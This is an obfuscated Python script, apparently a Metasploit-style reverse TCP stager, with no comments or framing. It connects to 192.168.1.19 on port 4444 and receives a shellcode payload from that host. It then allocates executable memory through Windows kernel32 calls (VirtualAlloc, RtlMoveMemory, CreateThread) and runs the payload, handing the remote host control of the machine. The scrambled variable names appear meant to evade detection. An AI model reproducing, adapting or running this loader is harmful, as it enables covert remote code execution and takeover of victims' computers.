import struct, socket, binascii, ctypes as iQoBfczKlObWZf, random, time
xekhuCkY, zoIECVTQhTj = None, None
def zVssstvNmgicvn():
	try:
		global zoIECVTQhTj
		zoIECVTQhTj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		zoIECVTQhTj.connect(('192.168.1.19', 4444))
		DJPFSzgUQQux = struct.pack('<i', zoIECVTQhTj.fileno())
		l = struct.unpack('<i', zoIECVTQhTj.recv(4))[0]
		IasvjMbxKPIdwLH = b"     "
		while len(IasvjMbxKPIdwLH) < l: IasvjMbxKPIdwLH += zoIECVTQhTj.recv(l)
		satFUNNsRfM = iQoBfczKlObWZf.create_string_buffer(IasvjMbxKPIdwLH, len(IasvjMbxKPIdwLH))
		satFUNNsRfM[0] = binascii.unhexlify('BF')
		for i in range(4): satFUNNsRfM[i+1] = DJPFSzgUQQux[i]
		return satFUNNsRfM
	except: return None
def VRCaJABtprpRyB(nMVnoXFiU):
	if nMVnoXFiU != None:
		tYVaUtytTUEhcF = bytearray(nMVnoXFiU)
		rMDSZLaNvmwVVd = iQoBfczKlObWZf.windll.kernel32.VirtualAlloc(iQoBfczKlObWZf.c_int(0),iQoBfczKlObWZf.c_int(len(tYVaUtytTUEhcF)),iQoBfczKlObWZf.c_int(0x3000),iQoBfczKlObWZf.c_int(0x40))
		exfCjLHFaYKBqou = (iQoBfczKlObWZf.c_char * len(tYVaUtytTUEhcF)).from_buffer(tYVaUtytTUEhcF)
		iQoBfczKlObWZf.windll.kernel32.RtlMoveMemory(iQoBfczKlObWZf.c_int(rMDSZLaNvmwVVd), exfCjLHFaYKBqou, iQoBfczKlObWZf.c_int(len(tYVaUtytTUEhcF)))
		ht = iQoBfczKlObWZf.windll.kernel32.CreateThread(iQoBfczKlObWZf.c_int(0),iQoBfczKlObWZf.c_int(0),iQoBfczKlObWZf.c_int(rMDSZLaNvmwVVd),iQoBfczKlObWZf.c_int(0),iQoBfczKlObWZf.c_int(0),iQoBfczKlObWZf.pointer(iQoBfczKlObWZf.c_int(0)))
		iQoBfczKlObWZf.windll.kernel32.WaitForSingleObject(iQoBfczKlObWZf.c_int(ht),iQoBfczKlObWZf.c_int(-1))
xekhuCkY = zVssstvNmgicvn()
VRCaJABtprpRyB(xekhuCkY)
